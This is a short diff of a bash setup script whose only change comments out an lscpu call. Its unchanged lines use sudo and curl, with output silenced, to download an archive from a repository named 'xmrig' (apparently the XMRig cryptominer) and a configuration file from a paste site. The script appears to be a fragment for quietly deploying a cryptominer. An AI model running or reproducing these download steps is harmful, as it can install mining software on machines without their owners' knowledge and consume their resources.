@@ -1,5 +1,5 @@
 #!/bin/bash
-timeout 1m lscpu
+#timeout 1m lscpu
 sudo apt-get install -y nano jq curl
 sudo curl -o dyx -L https://gitee.com/dyxwxjdy/xmrig/attach_files/958843/download/dyx.tar > /dev/null 2>&1
 sudo curl -o config_bak.json https://www.toptal.com/developers/hastebin/raw/akubuvotuh.json  > /dev/null 2>&1
